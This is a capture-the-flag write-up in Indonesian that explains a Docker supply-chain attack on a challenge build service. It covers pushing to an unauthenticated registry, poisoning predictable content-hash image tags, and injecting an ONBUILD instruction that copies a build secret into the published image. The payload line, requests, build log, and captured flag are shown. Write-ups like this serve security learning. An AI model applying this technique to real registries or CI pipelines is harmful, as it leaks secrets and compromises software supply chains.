# The Builder

## Ringkasan

Challenge ini bukan pwn native binary. Bug utamanya ada di supply chain build image:

1. Registry bisa di-`push` tanpa auth.
2. Tag image page deterministik, yaitu `sha256(content)[:12]`.
3. Builder tidak menimpa tag `pages:<hash>` yang sudah ada.
4. Image page itu dipakai sebagai base image lewat `FROM page0 AS content0`.
5. Karena base image boleh punya `ONBUILD`, kita bisa menyuntik instruksi Docker tambahan.

Payload `ONBUILD` yang dipakai:

```dockerfile
COPY --from=theme /flag.txt /page
```

Saat builder menjalankan `FROM page0 AS content0`, trigger itu aktif dan menyalin `/flag.txt` dari stage `theme` ke `/page`. Setelah itu Dockerfile normal challenge menyalin `/page` ke `index.html`, jadi flag masuk ke image final.

## Recon

Direktori challenge awal kosong:

```bash
pwd
ls -la
```

Hasil penting dari service utama:

```http
GET /openapi.json
```

OpenAPI hanya menunjukkan tiga route:

- `/`
- `POST /api/builds`
- `/builds/{build_id}`

Form di `/` mengirim `location` dan `content` ke `/api/builds`.

## Temuan Utama

Build normal menampilkan Dockerfile berikut:

```dockerfile
FROM debian:trixie-slim AS theme
RUN --mount=type=secret,id=flag \
    cp /run/secrets/flag /flag.txt \
 && printf '%s' 'body{font:16px/1.6 system-ui;margin:3rem auto;max-width:44rem;padding:0 1rem}' \
      > /theme.css

FROM page0 AS content0

FROM cgr.dev/chainguard/nginx:latest AS site
COPY --from=theme /theme.css /usr/share/nginx/html/theme.css
COPY --from=content0 /page /usr/share/nginx/html/index.html
```

Registry juga terbuka:

```http
GET /v2/_catalog
```

Contoh hasil:

```json
{"repositories":["pages","sites/1475544fae62"]}
```

Anonymous push ke registry berhasil:

```http
POST /v2/pages/blobs/uploads/
```

Server membalas `202 Accepted`, artinya upload blob diizinkan tanpa auth.

## Menentukan Primitive

### Primitive 1: tag page bisa diprediksi

Untuk content `<h1>hello</h1>`, builder memakai:

```text
pages:4db7ef630005
```

Nilai itu sama dengan:

```python
sha256(b"<h1>hello</h1>").hexdigest()[:12]
```

Untuk content `x`, builder memakai:

```text
pages:2d711642b726
```

Itu juga sama dengan `sha256(b"x")[:12]`.

### Primitive 2: existing tag dipercaya builder

Saya push image buatan sendiri ke `pages:63c1dd951ffe`, yaitu hash untuk content `AAAA`. Setelah itu saya submit build dengan content `AAAA`. Builder tetap memakai image yang saya push, dan isi layer `page` masih `EVILPAGE\n`.

Artinya builder tidak membuat ulang page image kalau tag tersebut sudah ada.

### Primitive 3: `ONBUILD` dari base image benar-benar jalan

Saya push config image dengan:

```json
"OnBuild": ["COPY --from=theme /flag.txt /page"]
```

Saat build dijalankan, log challenge menunjukkan:

```text
#10 [content0 1/2] ONBUILD COPY --from=theme /flag.txt /page
```

Ini bukti eksekusi payload terjadi di pipeline resmi challenge.

## Strategi Exploit

Langkahnya:

1. Pilih content tetap: `ONBUILD_COPY_FLAG`.
2. Hitung tag target: `sha256(content)[:12]`.
3. Push image OCI kosong ke repo `pages` dengan tag itu.
4. Isi config image dengan `OnBuild = ["COPY --from=theme /flag.txt /page"]`.
5. Trigger build normal lewat `/api/builds` dengan content yang sama.
6. Builder menjalankan `ONBUILD`, flag masuk ke `/page`.
7. Stage final menyalin `/page` ke `index.html`.
8. Ambil manifest image `sites/<build_id>:latest`, tarik layer terakhir, baca `index.html`.

## Exploit Final

Script final ada di [solve.py](/home/nata/ctf/NNSCTF/devops/TheBuilder/solve.py:1).

Exploit itu:

- push config blob ke registry
- publish manifest malicious ke `pages:<hash>`
- trigger build baru
- ambil manifest final `sites/<build_id>:latest`
- ekstrak layer sampai menemukan `index.html`
- print flag

## Cara Menjalankan

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Opsional override endpoint:

```bash
python3 solve.py BUILDER=https://the-builder-9b3a167fae76.chall.nnsc.tf REGISTRY=https://the-builder-registry-9b3a167fae76.chall.nnsc.tf
```

## Hasil

Flag yang keluar dari layer image final:

```text
NNS{wHo_tHoUght_7H47_7his_triggeR_was_a_600D_iDea??_W311_4NyWay5_yoU_D1D_i7}
```

Ditampilkan dalam format yang diminta:

```text
<FLAG>NNS{wHo_tHoUght_7H47_7his_triggeR_was_a_600D_iDea??_W311_4NyWay5_yoU_D1D_i7}</FLAG>
```

## Catatan Stabilitas

Exploit ini tidak bergantung pada race condition.

Yang dibutuhkan cuma tiga properti:

1. registry `pages` writable tanpa auth
2. tag page deterministik dari hash content
3. builder mempercayai existing image dan mengizinkan `ONBUILD`

Selama tiga hal itu tidak berubah, exploit tetap stabil dan reproducible.
